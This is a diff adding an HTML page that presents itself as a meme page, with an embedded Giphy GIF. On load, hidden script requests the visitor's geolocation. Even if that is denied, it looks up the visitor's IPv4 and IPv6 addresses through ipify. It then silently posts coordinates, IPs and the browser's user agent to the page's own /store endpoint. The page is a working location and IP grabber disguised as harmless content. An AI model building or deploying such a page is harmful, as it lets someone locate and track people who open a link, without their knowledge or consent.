@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+
+    <iframe src="https://giphy.com/embed/eqLowZa79LwOI" width="480" height="403" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+    <p><a href="https://giphy.com/gifs/meme-ouch-slide-eqLowZa79LwOI">via GIPHY</a></p>
+    
+<p id="demo"></p>
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError, true);
+  }
+}
+
+function showPosition(position) {
+    getIpAddresses(position.coords.latitude, position.coords.longitude);
+}
+
+function showError(error) {
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      getIpAddresses();
+      break;
+    case error.POSITION_UNAVAILABLE:
+    case error.TIMEOUT:
+    case error.UNKNOWN_ERROR:
+      break;
+  }
+}
+
+function getIpAddresses(lat = null, long = null) {
+    fetch('https://api64.ipify.org?format=json') // Fetching IPv6 address
+      .then(response => response.json())
+      .then(data => {
+          const ipv6 = data.ip;
+
+          fetch('https://api.ipify.org?format=json') // Fetching IPv4 address
+            .then(response => response.json())
+            .then(data => {
+                const ipv4 = data.ip;
+                
+                // Send location and IP info to server
+                fetch(`/store`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    lat,
+                    long,
+                    ipv4,
+                    ipv6,
+                    userAgent: navigator.userAgent
+                  })
+                });
+            });
+      });
+}
+</script>
+
+</body>
+</html>
+
